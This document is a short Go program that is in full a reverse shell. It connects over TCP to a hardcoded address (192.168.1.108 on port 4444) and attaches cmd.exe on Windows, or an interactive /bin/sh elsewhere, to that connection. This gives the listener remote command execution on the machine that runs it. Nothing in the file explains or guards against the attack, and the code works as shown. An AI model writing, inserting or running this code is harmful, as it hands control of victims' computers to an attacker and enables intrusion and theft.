package main

import (
        "net"
        "os/exec"
        "runtime"
)

func main() {
        c, err := net.Dial("tcp", "192.168.1.108:4444")
        if err != nil {
                return
        }
        defer c.Close()

        // Determine shell based on OS
        if runtime.GOOS == "windows" {
                runWindowsShell(c)
        } else {
                runUnixShell(c)
        }
}

func runWindowsShell(c net.Conn) {
        cmd := exec.Command("cmd.exe")
        cmd.Stdin = c
        cmd.Stdout = c
        cmd.Stderr = c
        cmd.Run()
}

func runUnixShell(c net.Conn) {
        cmd := exec.Command("/bin/sh", "-i")
        cmd.Stdin = c
        cmd.Stdout = c
        cmd.Stderr = c
        cmd.Run()
}